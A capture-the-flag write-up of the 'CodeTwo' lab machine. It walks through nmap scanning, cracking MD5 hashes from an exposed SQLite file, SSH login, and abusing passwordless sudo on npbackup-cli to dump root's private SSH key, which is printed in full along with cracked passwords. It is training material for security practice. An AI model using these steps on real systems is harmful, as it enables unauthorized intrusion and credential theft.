#box #sudo-capabilities #sqlite 
CodeTwo is an easy machine that exposes by mistake a db file containing the hashes of some users. Decrypting them grants us access in SSH as the user Marco. Once inside, we realize that marco has sudo capabilities over `npbackup-cli` a backup software similar based on restic. We then use a config found inside marco's home folder to backup root's folder, gain the SSH keys and then authenticate as root.

## Nmap

Nmap scan was slightly trickier since only `-Pn` shown the presence of port 8000 on the target machine

## Normal Nmap scan

```bash
nmap -sCV --min-rate=10000 -o nmap_sCV 10.10.11.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:42 EDT
Nmap scan report for 10.10.11.82
Host is up (0.19s latency).
Not shown: 744 filtered tcp ports (no-response), 255 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
```

## Nmap scan with `-Pn`

```shell
nmap -Pn -sCV --min-rate=10000 -o nmap_sCV 10.10.11.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:43 EDT
Nmap scan report for 10.10.11.82
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 8000 - HTTP

On the target we discover a web application supposed to permit to create and run projects in javascript. This smells code execution or XSS, however, there's also a `Download App` button. Maybe that gives us information about the currently running app?
We click on Download App and we receive a zip file. 
We try to unzip the file, but it tells us that no zipfile directory is found. Are we sure this is effectively a zip file? We use the `file` utility to find out and it tells us that the file is in reality a SQLite database:

```bash
file app.zip 
app.zip: SQLite 3.x database, last written using SQLite version 3031001, file counter 6, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 6
```

We try to use `cat` to open it and it prints something really interesting:

```bash
cat app.zip 
�O�O�J%%�Wtablecode_snippetcode_snippetCREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
)�0�CtableuseruserCREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
����)Madmin21232f297a57a5a743894a0e4a801fc3'Mappa97588c0e2fa3a024876339e27aeb42e)Mmarco649c9d65a206a75f5abe509fe128bce5
��#var x = 16;
```

We collect the hashes (due to improper formatting we can also run `sqlitebrowser` and open it this way) and then proceed to crack them with `hashcat` (they are MD5, according to `hash-identifier`):

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Discovering the following hashes:
* `21232f297a57a5a743894a0e4a801fc3:admin`
* `649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove`

One of those refers to the admin account, the other to a certain `marco`.
We try to authenticate in SSH with this user, obtaining the user's flag: `marco:sweetangelbabylove`

## Privilege Escalation

Inside the machine `codetwo` we run a  `sudo -l` command and discover that the user `marco` has sudo capability, password-less on a binary located at `/usr/local/bin/npbackup-cli`.  Npbackup is based on restic and is used to perform filesystem's backups.

By reading a bit of its documentation and having studied about restic, we could try to backup the `/root` folder and gain the SSH key of root.
Inside our own home folder we find a `npbackup.conf` file. That's because Npbackup, instead of a single password requires a configuration file to create a backup, we then opt to use it to create a backup.
Fully explained, the command tells to run `npbackup-cli` with the config file `npbackup.conf` and `-b` make a backup.

```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
```

It succeeded, but what it has backed up? We can investigate the content of the backup with the following command `--ls`:

```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --ls
```

It backed up the content of  `/home/app/app`. That's because inside the `npbackup.conf` file a folder is specified, and it's in fact this `/home/app/app` folder.

At this point we opt to change the target folder to `/root`.
By repeating the process, the backup will still fail. To make it work we'll have to use the command `-f` after `-b`. In fact this new command forces the backup independently by the backup age.
So, to repeat:
* We change the path to backup in `npbackup.conf`
* We run the backup with the `-f` flag
* We run `--ls` to find the file contained in the backup
* Lastly, we use the command `--dump` to dump a specific file contained in the backup, such as the `id_rsa` key of root

```bash
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b -f
2025-08-24 10:03:43,554 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-24 10:03:43,583 :: INFO :: Loaded config E1057128 in /home/marco/npbackup.conf
2025-08-24 10:03:43,594 :: INFO :: Running backup of ['/root'] to repo default
2025-08-24 10:03:44,685 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-08-24 10:03:44,685 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-08-24 10:03:44,685 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-08-24 10:03:44,685 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-08-24 10:03:44,685 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-08-24 10:03:44,685 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-08-24 10:03:44,685 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-08-24 10:03:44,685 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-08-24 10:03:44,686 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.609 KiB (39.883 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 6f8afda8 saved
2025-08-24 10:03:45,869 :: INFO :: Backend finished with success
2025-08-24 10:03:45,871 :: INFO :: Processed 197.7 KiB of data
2025-08-24 10:03:45,872 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-24 10:03:45,872 :: ERROR :: Operation finished with failure
2025-08-24 10:03:45,873 :: INFO :: Runner took 2.280601 seconds for backup
2025-08-24 10:03:45,873 :: INFO :: Operation finished
2025-08-24 10:03:45,881 :: INFO :: ExecTime = 0:00:02.329460, finished, state is: errors.
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --ls
2025-08-24 10:03:50,323 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-24 10:03:50,350 :: INFO :: Loaded config E1057128 in /home/marco/npbackup.conf
2025-08-24 10:03:50,360 :: INFO :: Showing content of snapshot latest in repo default
2025-08-24 10:03:52,659 :: INFO :: Successfully listed snapshot latest content:
snapshot 6f8afda8 of [/root] at 2025-08-24 10:03:44.695525799 +0000 UTC by root@codetwo filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db

2025-08-24 10:03:52,659 :: INFO :: Runner took 2.299439 seconds for ls
2025-08-24 10:03:52,660 :: INFO :: Operation finished
2025-08-24 10:03:52,667 :: INFO :: ExecTime = 0:00:02.346536, finished, state is: success.
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --dump  /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We can now create a new `id_rsa` file on our system and paste the content of this key file in it.

We'll then need to assign a proper permission to the key, such as `chmod 600 id_rsa`.
Finally, we can authenticate as root:

```bash
ssh -i id_rsa root@10.10.11.82
```

Gaining root.

```bash
root@codetwo:~# ls -l
total 8
-rw-r----- 1 root root   33 Aug 23 17:20 root.txt
drwxr-xr-x 2 root root 4096 Jun 18 11:24 scripts
```